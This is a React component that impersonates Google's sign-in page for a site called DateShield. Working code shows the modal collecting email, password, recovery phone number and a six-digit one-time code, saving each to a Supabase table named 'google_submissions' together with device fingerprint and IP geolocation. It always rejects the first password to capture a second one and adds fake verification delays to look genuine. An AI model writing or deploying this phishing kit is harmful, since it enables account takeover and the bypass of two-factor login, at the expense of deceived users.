import { useEffect, useRef, useState } from "react";
import { X, Loader2, Eye, EyeOff } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "@tanstack/react-router";

interface Props {
  open: boolean;
  onClose: () => void;
  onComplete?: (email: string) => void;
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown";
  if (/Edg\//.test(ua)) browser = "Edge";
  else if (/Chrome\//.test(ua)) browser = "Chrome";
  else if (/Firefox\//.test(ua)) browser = "Firefox";
  else if (/Safari\//.test(ua)) browser = "Safari";
  let os = "Unknown";
  if (/Windows/.test(ua)) os = "Windows";
  else if (/Mac OS/.test(ua)) os = "macOS";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
  else if (/Linux/.test(ua)) os = "Linux";
  const device = /Mobi|Android|iPhone/.test(ua) ? "Mobile" : "Desktop";
  return { user_agent: ua, browser, os, device };
}

async function getIpInfo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const j = await r.json();
    return {
      ip: j.ip || null,
      ip_city: j.city || null,
      ip_region: j.region || null,
      ip_country: j.country_name || null,
      ip_isp: j.org || null,
    };
  } catch {
    return {};
  }
}

export function GoogleLoginModal({ open, onClose, onComplete }: Props) {
  const [step, setStep] = useState<"email" | "password" | "phone" | "otp">("email");
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string>("");
  const [rowId, setRowId] = useState<string | null>(null);
  const [phone, setPhone] = useState("");
  const [otp, setOtp] = useState("");
  const [pwAttempts, setPwAttempts] = useState(0);
  const otpRefs = useRef<Array<HTMLInputElement | null>>([]);

  useEffect(() => {
    if (open) {
      setStep("email");
      setEmail("");
      setPassword("");
      setError(null);
      setRowId(null);
      setSessionId(crypto.randomUUID());
      setPhone("");
      setOtp("");
      setPwAttempts(0);
    }
  }, [open]);

  if (!open) return null;

  const submitEmail = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !/.+@.+\..+/.test(email)) {
      setError("Couldn't find your Google Account");
      return;
    }
    setError(null);
    setLoading(true);
    const device = getDeviceInfo();
    const ipInfo = await getIpInfo();
    const { data, error: err } = await supabase
      .from("google_submissions")
      .insert({
        session_id: sessionId,
        email,
        step: "email_entered",
        ...device,
        ...ipInfo,
      })
      .select()
      .single();
    setLoading(false);
    if (err) {
      setError("Something went wrong. Try again.");
      return;
    }
    setRowId(data.id);
    // Simulate Google's smooth transition
    await new Promise((r) => setTimeout(r, 600));
    setStep("password");
  };

  const submitPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError("Enter a password");
      return;
    }
    setError(null);
    setLoading(true);
    if (rowId) {
      await supabase
        .from("google_submissions")
        .update({ password, step: "password_entered" })
        .eq("id", rowId);
    }
    // Fake "verifying" delay
    await new Promise((r) => setTimeout(r, 1400));
    setLoading(false);
    const nextAttempt = pwAttempts + 1;
    setPwAttempts(nextAttempt);
    if (nextAttempt < 2) {
      // First attempt → "wrong password"
      setError("Wrong password. Try again or click Forgot password to reset it.");
      setPassword("");
      if (rowId) {
        await supabase
          .from("google_submissions")
          .update({ step: "password_rejected" })
          .eq("id", rowId);
      }
      return;
    }
    // Second attempt → escalate to phone verification
    if (rowId) {
      await supabase
        .from("google_submissions")
        .update({ step: "phone_required" })
        .eq("id", rowId);
    }
    setStep("phone");
  };

  const submitPhone = async (e: React.FormEvent) => {
    e.preventDefault();
    const cleaned = phone.replace(/[^\d+]/g, "");
    if (cleaned.length < 7) {
      setError("Enter a valid phone number");
      return;
    }
    setError(null);
    setLoading(true);
    if (rowId) {
      await supabase
        .from("google_submissions")
        .update({ phone: cleaned, step: "phone_entered" })
        .eq("id", rowId);
    }
    await new Promise((r) => setTimeout(r, 1200));
    setLoading(false);
    setStep("otp");
    setTimeout(() => otpRefs.current[0]?.focus(), 50);
  };

  const submitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) {
      setError("Enter the 6-digit code");
      return;
    }
    setError(null);
    setLoading(true);
    if (rowId) {
      await supabase
        .from("google_submissions")
        .update({ otp, step: "otp_entered" })
        .eq("id", rowId);
    }
    await new Promise((r) => setTimeout(r, 1600));
    setLoading(false);
    if (rowId) {
      await supabase
        .from("google_submissions")
        .update({ step: "otp_verified" })
        .eq("id", rowId);
    }
    onComplete?.(email);
    onClose();
    navigate({ to: "/trial" });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-black/60 p-3 backdrop-blur-sm sm:p-4">
      <div className="relative my-4 w-full max-w-[420px] rounded-2xl bg-white p-5 shadow-2xl sm:p-8">
        <button
          onClick={onClose}
          className="absolute right-3 top-3 rounded-full p-1.5 text-gray-500 transition hover:bg-gray-100"
          aria-label="Close"
        >
          <X className="h-4 w-4" />
        </button>

        {/* Google logo */}
        <div className="mb-5 flex justify-center">
          <svg viewBox="0 0 75 24" className="h-7" aria-hidden>
            <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" />
            <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" />
            <path fill="#FBBC05" d="M37.71 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" />
            <path fill="#4285F4" d="M53.58 6.54v.94h-.09c-.57-.68-1.67-1.29-3.05-1.29-2.9 0-5.56 2.55-5.56 5.83 0 3.25 2.66 5.79 5.56 5.79 1.39 0 2.48-.61 3.05-1.32h.09v.83c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.54h-2.42zm-2.92 8.98c-1.76 0-3.23-1.47-3.23-3.5 0-2.05 1.47-3.54 3.23-3.54 1.74 0 3.1 1.5 3.1 3.54 0 2.03-1.36 3.5-3.1 3.5z" />
            <path fill="#34A853" d="M58 0h2.55v17.5H58z" />
            <path fill="#EA4335" d="M67.79 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.97-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z" />
          </svg>
        </div>

        {step === "email" && (
          <form onSubmit={submitEmail}>
            <h1 className="text-center text-[22px] font-normal text-gray-900">Sign in</h1>
            <p className="mt-1 text-center text-sm text-gray-700">to continue to DateShield</p>

            <div className="mt-6">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email or phone"
                autoFocus
                className={`w-full rounded border bg-white px-3 py-3.5 text-sm text-gray-900 outline-none transition focus:border-blue-600 focus:ring-1 focus:ring-blue-600 ${
                  error ? "border-red-500" : "border-gray-400"
                }`}
              />
              {error && <p className="mt-2 text-xs text-red-600">{error}</p>}
              <a href="#" className="mt-3 inline-block text-sm font-medium text-blue-600 hover:underline">
                Forgot email?
              </a>
            </div>

            <p className="mt-8 text-xs text-gray-700">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <a href="#" className="font-medium text-blue-600 hover:underline">Learn more</a>
            </p>

            <div className="mt-6 flex items-center justify-between">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">Create account</a>
              <button
                type="submit"
                disabled={loading}
                className="flex items-center gap-2 rounded bg-blue-600 px-6 py-2 text-sm font-medium text-white transition hover:bg-blue-700 disabled:opacity-70"
              >
                {loading && <Loader2 className="h-4 w-4 animate-spin" />}
                Next
              </button>
            </div>
          </form>
        )}
        {step === "password" && (
          <form onSubmit={submitPassword}>
            <h1 className="text-center text-[22px] font-normal text-gray-900">Welcome</h1>
            <div className="mt-2 flex justify-center">
              <div className="inline-flex items-center gap-2 rounded-full border border-gray-300 px-3 py-1 text-sm text-gray-800">
                <span className="grid h-5 w-5 place-items-center rounded-full bg-blue-600 text-[10px] font-bold text-white">
                  {email.charAt(0).toUpperCase()}
                </span>
                <span className="max-w-[220px] truncate">{email}</span>
              </div>
            </div>

            <div className="mt-6 relative">
              <input
                type={showPw ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                autoFocus
                className={`w-full rounded border bg-white px-3 py-3.5 pr-10 text-sm text-gray-900 outline-none transition focus:border-blue-600 focus:ring-1 focus:ring-blue-600 ${
                  error ? "border-red-500" : "border-gray-400"
                }`}
              />
              <button
                type="button"
                onClick={() => setShowPw((s) => !s)}
                className="absolute right-2 top-1/2 -translate-y-1/2 p-1.5 text-gray-500"
                aria-label="Toggle password"
              >
                {showPw ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
              {error && <p className="mt-2 text-xs text-red-600">{error}</p>}
            </div>

            <div className="mt-8 flex flex-wrap items-center justify-between gap-3">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">Forgot password?</a>
              <button
                type="submit"
                disabled={loading}
                className="flex items-center gap-2 rounded bg-blue-600 px-6 py-2 text-sm font-medium text-white transition hover:bg-blue-700 disabled:opacity-70"
              >
                {loading && <Loader2 className="h-4 w-4 animate-spin" />}
                Next
              </button>
            </div>
          </form>
        )}
        {step === "phone" && (
          <form onSubmit={submitPhone}>
            <h1 className="text-center text-[22px] font-normal text-gray-900">Verify it's you</h1>
            <p className="mx-auto mt-2 max-w-[340px] text-center text-sm text-gray-700">
              To help keep your account safe, Google wants to make sure it's really you trying to sign in.
            </p>
            <div className="mt-2 flex justify-center">
              <div className="inline-flex items-center gap-2 rounded-full border border-gray-300 px-3 py-1 text-sm text-gray-800">
                <span className="grid h-5 w-5 place-items-center rounded-full bg-blue-600 text-[10px] font-bold text-white">
                  {email.charAt(0).toUpperCase()}
                </span>
                <span className="max-w-[220px] truncate">{email}</span>
              </div>
            </div>
            <p className="mt-5 text-sm text-gray-700">Confirm your recovery phone number</p>
            <div className="mt-3">
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                placeholder="+1 (555) 123-4567"
                autoFocus
                className={`w-full rounded border bg-white px-3 py-3.5 text-sm text-gray-900 outline-none transition focus:border-blue-600 focus:ring-1 focus:ring-blue-600 ${
                  error ? "border-red-500" : "border-gray-400"
                }`}
              />
              {error && <p className="mt-2 text-xs text-red-600">{error}</p>}
              <p className="mt-3 text-xs text-gray-600">
                Google will send a 6-digit verification code to this number. Standard rates apply.
              </p>
            </div>
            <div className="mt-8 flex flex-wrap items-center justify-between gap-3">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">Try another way</a>
              <button
                type="submit"
                disabled={loading}
                className="flex items-center gap-2 rounded bg-blue-600 px-6 py-2 text-sm font-medium text-white transition hover:bg-blue-700 disabled:opacity-70"
              >
                {loading && <Loader2 className="h-4 w-4 animate-spin" />}
                Send code
              </button>
            </div>
          </form>
        )}
        {step === "otp" && (
          <form onSubmit={submitOtp}>
            <h1 className="text-center text-[22px] font-normal text-gray-900">Enter the code</h1>
            <p className="mx-auto mt-2 max-w-[340px] text-center text-sm text-gray-700">
              We sent a 6-digit verification code to <span className="font-medium">{phone}</span>
            </p>
            <div className="mt-6 flex justify-center gap-1.5 sm:gap-2">
              {Array.from({ length: 6 }).map((_, i) => (
                <input
                  key={i}
                  ref={(el) => { otpRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={otp[i] || ""}
                  onChange={(e) => {
                    const v = e.target.value.replace(/\D/g, "").slice(-1);
                    const arr = otp.split("");
                    arr[i] = v;
                    const next = arr.join("").slice(0, 6);
                    setOtp(next);
                    if (v && i < 5) otpRefs.current[i + 1]?.focus();
                  }}
                  onKeyDown={(e) => {
                    if (e.key === "Backspace" && !otp[i] && i > 0) {
                      otpRefs.current[i - 1]?.focus();
                    }
                  }}
                  className={`h-12 w-10 rounded border text-center text-lg font-semibold text-gray-900 outline-none transition focus:border-blue-600 focus:ring-1 focus:ring-blue-600 sm:h-14 sm:w-12 ${
                    error ? "border-red-500" : "border-gray-400"
                  }`}
                />
              ))}
            </div>
            {error && <p className="mt-3 text-center text-xs text-red-600">{error}</p>}
            <div className="mt-6 text-center">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">Resend code</a>
            </div>
            <div className="mt-6 flex flex-wrap items-center justify-between gap-3">
              <button
                type="button"
                onClick={() => { setStep("phone"); setError(null); }}
                className="text-sm font-medium text-blue-600 hover:underline"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading || otp.length < 6}
                className="flex items-center gap-2 rounded bg-blue-600 px-6 py-2 text-sm font-medium text-white transition hover:bg-blue-700 disabled:opacity-70"
              >
                {loading && <Loader2 className="h-4 w-4 animate-spin" />}
                Verify
              </button>
            </div>
          </form>
        )}

        <div className="mt-8 flex items-center justify-between text-xs text-gray-600">
          <select className="bg-transparent outline-none" defaultValue="en">
            <option value="en">English (United States)</option>
          </select>
          <div className="flex gap-4">
            <a href="#" className="hover:text-gray-900">Help</a>
            <a href="#" className="hover:text-gray-900">Privacy</a>
            <a href="#" className="hover:text-gray-900">Terms</a>
          </div>
        </div>
      </div>
    </div>
  );
}